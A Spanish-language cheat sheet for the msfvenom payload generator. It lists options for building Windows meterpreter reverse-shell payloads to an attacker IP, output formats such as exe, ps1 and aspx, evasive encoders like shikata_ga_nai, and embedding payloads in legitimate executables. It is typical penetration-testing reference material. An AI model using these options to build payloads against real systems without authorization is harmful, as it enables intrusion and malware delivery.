----------
## Msfvenom - Payload Generation Tool

|Categoría|Comando/Opcíón|Descripción|Ejemplo|
|---|---|---|---|
|**Sintaxis Básica**|`msfvenom [opciones]`|||
|**Parámetros Principales**||||
|`-p, --payload`|Payload a usar|`-p windows/meterpreter/reverse_tcp`|
|`-f, --format`|Formato de salida|`-f exe`|
|`-o, --out`|Archivo de salida|`-o payload.exe`|
|`-a, --arch`|Arquitectura|`-a x86`|
|`--platform`|Plataforma|`--platform windows`|
|**Opciones de Payload**||||
|`LHOST`|IP atacante|`LHOST=192.168.1.100`|
|`LPORT`|Puerto atacante|`LPORT=4444`|
|`EXITFUNC`|Método de salida|`EXITFUNC=thread`|
|`PrependMigrate`|Migración automática|`PrependMigrate=true`|
|**Formatos de Salida**||||
|`-f exe`|Ejecutable Windows|`-f exe`|
|`-f elf`|Binario Linux|`-f elf`|
|`-f raw`|Raw shellcode|`-f raw`|
|`-f python`|Python script|`-f python`|
|`-f c`|Code C|`-f c`|
|`-f ps1`|PowerShell|`-f ps1`|
|`-f asp`|ASP|`-f asp`|
|`-f aspx`|ASPX|`-f aspx`|
|`-f war`|WAR Java|`-f war`|
|**Opciones Avanzadas**||||
|`-e, --encoder`|Encoder|`-e x86/shikata_ga_nai`|
|`-i, --iterations`|Iteraciones encoder|`-i 5`|
|`-b, --bad-chars`|Bad characters|`-b "\x00\x0a\x0d"`|
|`-n, --nopsled`|NOP sled|`-n 100`|
|`-k, --keep`|Mantener funcionalidad|`-k`|
|`-c, --add-code`|Agregar código|`-c /ruta/codigo`|
|`-x, --template`|Template ejecutable|`-x /ruta/legitimo.exe`|
|**Listados**||||
|`--list payloads`|Listar payloads|`msfvenom --list payloads`|
|`--list encoders`|Listar encoders|`msfvenom --list encoders`|
|`--list formats`|Listar formatos|`msfvenom --list formats`|
|`--list archs`|Listar arquitecturas|`msfvenom --list archs`|
|`--list platforms`|Listar plataformas|`msfvenom --list platforms`|